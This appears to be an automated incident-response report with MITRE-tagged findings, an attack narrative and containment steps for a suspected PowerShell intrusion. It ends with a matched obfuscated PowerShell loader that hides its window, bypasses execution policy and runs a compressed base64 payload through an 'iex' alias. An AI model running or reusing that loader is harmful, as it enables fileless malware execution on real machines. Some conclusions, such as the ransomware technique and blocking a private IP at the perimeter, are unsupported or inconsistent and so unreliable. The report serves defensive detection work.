attack_patterns.description: Obfuscated PowerShell execution with stealth flags

verification_steps: MITRE: T1486 - Data Encrypted for Impact

validated_findings.description: PROCESS_ALL_ACCESS on system process — definitive process injection
PowerShell stealth execution flags — malware loader signature
TLS cert issued by Let's Encrypt for Microsoft-named domain — typosquatting C2
validated_findings.mitre: T1071.001 - Web Protocols / T1568 - Dynamic Resolution

validated_findings.description: TLS cert issued by Let's Encrypt for Microsoft-named domain — typosquatting C2
validated_findings.mitre: T1071.001 - Web Protocols / T1568 - Dynamic Resolution

attack_narrative: A heavily obfuscated PowerShell command was executed on A1B2C3D4-E5F6 (ProcessID 1128) using ExecutionPolicy Bypass and WindowStyle Hidden flags, indicating a fileless malware execution technique designed to evade endpoint detection. The malicious process injected shellcode into a legitimate system process (GrantedAccess=0x1FFFFF) — this is PROCESS_ALL_ACCESS, a definitive indicator of process injection used to achieve execution within a trusted process and bypass security monitoring. The attack chain represents a complete APT intrusion lifecycle: obfuscated execution, process injection for persistence, and beaconing to external C2 infrastructure — consistent with a Cobalt Strike or similar commercial implant deployment.
containment_actions: BLOCK IP 104.21.55.12 at perimeter firewall and all internal segment boundaries
BLOCK IP 192.168.1.105 at perimeter firewall and all internal segment boundaries
ISOLATE host A1B2C3D4-E5F6 immediately — disconnect from all network segments
ISOLATE host DESKTOP-DEV immediately — disconnect from all network segments
ISOLATE host DESKTOP-DEV-99A immediately — disconnect from all network segments
KILL all suspicious process trees — terminate injected processes
DUMP memory of svchost.exe instances for forensic analysis
ENABLE PowerShell ScriptBlock logging (Event 4104) across all endpoints
ENFORCE Constrained Language Mode for PowerShell enterprise-wide
REVIEW Windows Defender AMSI logs for bypass attempts
DEPLOY EDR memory scanning across all endpoints immediately
ENABLE Windows Credential Guard to prevent credential extraction
REVIEW all TLS connections — audit certificate issuers for anomalies
BLOCK all outbound connections to domains with mismatched certificate issuers
REVIEW all TLS connections — audit certificate issuers for anomalies
BLOCK all outbound connections to domains with mismatched certificate issuers
PRESERVE all Sysmon, network, and endpoint logs for legal/forensic proceedings
NOTIFY CISO and legal team — assess breach notification obligations

temporal_sequences.description: Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window
temporal_sequences.mitre_technique: T1055 - Process Injection / T1071 - C2 Communication

matches: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "$e=env:public[13]+env:public[14]+'x';Set-Alias -Name r -Value $e; r (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0rMK00tSdWrzc1N1kvOz9UrycxN1StPLEnVS8vM0yvJyCXJ6F4A'),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()"
